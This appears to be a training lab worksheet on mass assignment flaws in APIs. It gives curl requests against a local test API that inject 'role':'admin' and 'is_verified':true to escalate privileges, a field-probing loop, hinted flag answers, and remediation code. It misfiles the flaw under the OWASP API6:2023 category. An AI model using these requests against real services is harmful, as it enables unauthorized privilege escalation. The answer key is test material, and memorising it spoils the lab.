# Lab 07: Mass Assignment Vulnerabilities

## Objective

Exploit mass assignment vulnerabilities to escalate privileges, self-verify accounts, and manipulate user attributes by injecting unexpected fields into API requests.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Medium |
| **Estimated Time** | 45 minutes |
| **Prerequisites** | Labs 01–06 completed, Burp Suite or curl, Python 3 with `requests` |
| **OWASP API Category** | API6:2023 – Unrestricted Access to Sensitive Business Flows |

---

## Background

### What Is Mass Assignment?

Mass assignment occurs when an API automatically binds client-supplied data (usually JSON) to internal data models **without filtering which fields the client is allowed to set**. If the server blindly accepts every field in the request body, an attacker can inject fields the developer never intended to be user-controllable — such as `role`, `is_admin`, `is_verified`, or `account_balance`.

### Why Is It Dangerous?

| Scenario | Impact |
|---|---|
| Setting `role` to `admin` during registration | Full privilege escalation |
| Setting `is_verified` to `true` | Bypass email verification |
| Setting `account_balance` to an arbitrary value | Financial fraud |
| Setting `is_active` to `true` after ban | Ban evasion |

### How Modern Frameworks Are Vulnerable

Many frameworks (Express.js, Flask, Django, Rails) will pass incoming JSON directly to the ORM's `create()` or `update()` method. If no allowlist (also called a "whitelist" or "strong parameters") is defined, **every column in the database table becomes writable**.

```
# Vulnerable Flask/SQLAlchemy pattern:
user = User(**request.json)   # ALL fields from JSON go into the model
db.session.add(user)
db.session.commit()
```

### Real-World Examples

- **2012 – GitHub**: A mass assignment bug in Rails allowed a user to add their SSH key to any organization, including the Rails core team repository.
- **2019 – Various SaaS**: Multiple platforms allowed `role` escalation through registration endpoints.

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5000` |
| Test User 1 | `alice` / `password123` (regular user, id=1) |
| Test User 2 | `bob` / `password123` (regular user, id=2) |
| Admin User | `admin` / `admin123` (admin, id=4) |

---

## Tasks

### Task 1: Register a User with an Elevated Role

**Goal:** Register a brand-new user and inject the `role` field to become an administrator immediately.

**Steps:**

1. Craft a registration request that includes the `role` field set to `admin`:

```bash
curl -s -X POST http://localhost:5000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hack@evil.com",
    "password": "hack123",
    "role": "admin"
  }'
```

2. Examine the response carefully. What role was assigned to the new user?
3. Login as the newly created user and confirm your role in the JWT payload or in the user profile response.

```bash
curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hack123"}'
```

4. Decode the returned JWT token (base64 decode the middle section) to verify your role claim.

> **🚩 FLAG 1:** What role was assigned to the newly registered user?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
Look at the JSON response from the registration endpoint. Is there a <code>role</code> field in the response body?
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
The server uses <code>User(**request.json)</code> internally, which means every field in your JSON is passed to the model constructor — including <code>role</code>.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The response should show <code>"role": "admin"</code>. The FLAG is: <strong>admin</strong>
</details>

---

### Task 2: Self-Verify Your Account

**Goal:** Bypass email verification by updating the `is_verified` field through the user update endpoint.

**Steps:**

1. First, check your current profile to see the `is_verified` status:

```bash
# Get your auth token first
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hack123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# View your profile (replace :id with your user ID from registration)
curl -s http://localhost:5000/api/v1/users/5 \
  -H "Authorization: Bearer $TOKEN"
```

2. Send a PUT request to update your own profile with `is_verified` set to `true`:

```bash
curl -s -X PUT http://localhost:5000/api/v1/users/5 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"is_verified": true}'
```

3. Check your profile again to confirm the field was updated.

> **🚩 FLAG 2:** Successfully self-verify your account (is_verified changes from false to true)

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
The PUT endpoint for updating a user profile also lacks field filtering. Try adding <code>is_verified</code> to the JSON body.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
The same mass assignment pattern applies to the update endpoint. Fields like <code>is_verified</code>, <code>role</code>, and others may all be writable.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
Send <code>{"is_verified": true}</code> in a PUT request to <code>/api/v1/users/:id</code>. The response should show <code>"is_verified": true</code>.
</details>

---

### Task 3: Escalate an Existing User's Role

**Goal:** Use the PUT endpoint to change your own role from `user` to `admin`.

**Steps:**

1. Login as `alice` (a regular user):

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

2. Attempt to update alice's role:

```bash
curl -s -X PUT http://localhost:5000/api/v1/users/1 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "admin"}'
```

3. Verify the role was changed by viewing the profile again.

4. Try accessing an admin-only endpoint with the updated role:

```bash
curl -s http://localhost:5000/api/v1/admin/users \
  -H "Authorization: Bearer $TOKEN"
```

---

### Task 4: Enumerate All Mass-Assignable Fields

**Goal:** Systematically discover every field the API accepts but shouldn't.

**Steps:**

1. Try injecting various common fields one at a time:

```bash
# Test each field individually
for field in role is_verified is_admin is_active account_type permissions created_at updated_at internal_notes; do
  echo "Testing field: $field"
  curl -s -X PUT http://localhost:5000/api/v1/users/1 \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"$field\": \"test_value\"}"
  echo ""
done
```

2. Compare the responses. Which fields were accepted and which were silently ignored or caused errors?

3. Document which fields should be user-writable vs. server-controlled:

| Field | Should Be Writable? | Actually Writable? |
|---|---|---|
| `username` | Yes | ? |
| `email` | Yes | ? |
| `bio` | Yes | ? |
| `role` | **No** | ? |
| `is_verified` | **No** | ? |
| `is_active` | **No** | ? |
| `internal_notes` | **No** | ? |

> **🚩 FLAG 3:** List all fields that can be mass-assigned (at minimum: role, is_verified)

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
Send PUT requests with different field names and observe which ones appear in the response with your provided values.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
The API model likely has columns such as: <code>username</code>, <code>email</code>, <code>bio</code>, <code>role</code>, <code>is_verified</code>, <code>is_active</code>, <code>internal_notes</code>, <code>password_hash</code>. Test each one.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
Mass-assignable fields include at minimum: <code>role</code>, <code>is_verified</code>, <code>is_active</code>, <code>internal_notes</code>. All model columns without explicit protection are writable.
</details>

---

### Task 5: Compare Expected vs. Actual Behavior

**Goal:** Document the security gap between what the API should accept and what it actually accepts.

Create a comparison table:

| Endpoint | Expected Accepted Fields | Actually Accepted Fields | Risk |
|---|---|---|---|
| POST /register | username, email, password | username, email, password, **role**, ... | Privilege escalation |
| PUT /users/:id | username, email, bio | username, email, bio, **role**, **is_verified**, ... | Role tampering, bypass verification |

---

## Flags Summary

| Flag | Description | Value |
|---|---|---|
| FLAG 1 | Role of newly registered user | `admin` |
| FLAG 2 | Self-verify account | `is_verified` changes to `true` |
| FLAG 3 | Mass-assignable fields | `role`, `is_verified`, `is_active`, `internal_notes` (at minimum) |

---

## Remediation

### 1. Use an Allowlist (Strong Parameters)

Only accept explicitly permitted fields:

```python
# Python/Flask example
ALLOWED_REGISTER_FIELDS = {'username', 'email', 'password'}
ALLOWED_UPDATE_FIELDS = {'username', 'email', 'bio', 'avatar_url'}

@app.route('/api/v1/auth/register', methods=['POST'])
def register():
    data = request.json
    # Filter to only allowed fields
    filtered_data = {k: v for k, v in data.items() if k in ALLOWED_REGISTER_FIELDS}
    user = User(**filtered_data)
    user.role = 'user'          # Explicitly set server-controlled fields
    user.is_verified = False
    db.session.add(user)
    db.session.commit()
```

### 2. Use DTOs / Schemas

Define explicit input schemas (e.g., with Marshmallow or Pydantic):

```python
from pydantic import BaseModel

class UserRegisterRequest(BaseModel):
    username: str
    email: str
    password: str
    # role is NOT here — cannot be set by client

class UserUpdateRequest(BaseModel):
    username: str | None = None
    email: str | None = None
    bio: str | None = None
    # role, is_verified, is_active are NOT here
```

### 3. Separate Read and Write Models

Use different serialization models for input vs. output:

- **Input model:** Only user-controllable fields
- **Output model:** Can include read-only fields like `role`, `created_at`

### 4. Set Sensitive Fields Server-Side

Always assign sensitive fields explicitly in your code, never from user input:

```python
user.role = 'user'           # Always set by server
user.is_verified = False     # Always set by server
user.is_active = True        # Always set by server
```

### 5. Automated Testing

Add integration tests that verify mass assignment is blocked:

```python
def test_register_cannot_set_role():
    response = client.post('/api/v1/auth/register', json={
        'username': 'test', 'email': 'test@test.com',
        'password': 'test123', 'role': 'admin'
    })
    assert response.json()['role'] == 'user'  # Must be 'user', not 'admin'
```

---

## References

- [OWASP API Security Top 10 – API6:2023](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [GitHub Mass Assignment Incident (2012)](https://blog.github.com/2012-03-04-public-key-security-vulnerability-and-mitigation/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
